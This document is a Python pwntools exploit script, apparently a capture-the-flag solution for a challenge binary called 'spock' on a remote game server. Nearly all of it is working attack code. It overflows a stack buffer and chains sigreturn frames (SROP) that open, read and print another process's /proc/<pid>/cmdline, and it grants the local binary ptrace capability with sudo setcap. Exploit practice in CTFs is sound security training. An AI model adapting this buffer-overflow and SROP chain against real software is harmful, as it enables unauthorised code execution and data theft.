#! /usr/bin/python
from pwn import *
from os import system

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote('mindmeld.martiansonly.net',31337)
    else:
        system("sudo setcap cap_sys_ptrace=ep $PWD/spock")
        return process(binary)

    

def exploit(p,e):

    p.recvuntil(b"Scotty's mental frequency is:")
    
    pid = int(p.recvline().strip(),10)
    log.info(f"Got processes pid {pid}")

    pad = b"A" * 24

    buffer = 0x404200
    syscall_ret = 0x40121c
    sigreturn_sys = 0x401219
    flag_heap_addr = 0x404050
    
    memory_size = 0x80
    
    # Read Sigreturn
    rframe = SigreturnFrame(kernel='amd64')
    rframe.rsi = buffer 
    rframe.rdx = 0x1000
    rframe.rsp = buffer + memory_size
    rframe.rbp = buffer
    rframe.rip = syscall_ret

    # pop rax syscall
    chain = p64(sigreturn_sys)
    chain += bytes(rframe)
    
    p.recvuntil(b"Your thoughts to my thoughts >>>")
    p.sendline(pad + chain)
    pause()

    i = 0
    frame_size = 0

    
    # open("/proc/(pid)/cmdline")
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall_ret
    frame.rbp = buffer
    frame.rsp = buffer + memory_size + (frame_size) * i
    frame.rax = 2 # open
    frame.rdi = buffer # /proc/pid/cmdline

    i += 1
    frame_size = 8 + len(bytes(frame))
    frame.rsp = buffer + memory_size + (frame_size) * i

    chain2 = b"/proc/%d/cmdline" % pid 
    chain2 += b"\x00" * (0x80 - len(chain2)) +  p64(sigreturn_sys) + bytes(frame)
    
    frame.rsp = buffer + memory_size + (frame_size) * i
    frame.rax = 0 # read 
    frame.rdi = 3 # fd
    frame.rsi = buffer + 0x30 # fake stack
    frame.rdx = 0x30 #size 

    i += 1
    frame_size = 8 + len(bytes(frame))
    frame.rsp = buffer + memory_size + (frame_size) * i

    chain2 += p64(sigreturn_sys) + bytes(frame)
    
    frame.rsp = buffer + memory_size + (frame_size) * i
    frame.rax = 1 # write
    frame.rdi = 1 # stdout

    i += 1
    frame_size = 8 + len(bytes(frame))
    frame.rsp = buffer + memory_size + (frame_size) * i

    chain2 += p64(sigreturn_sys) + bytes(frame)


    p.sendline(chain2)
    p.interactive()
    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    exploit(p,e)
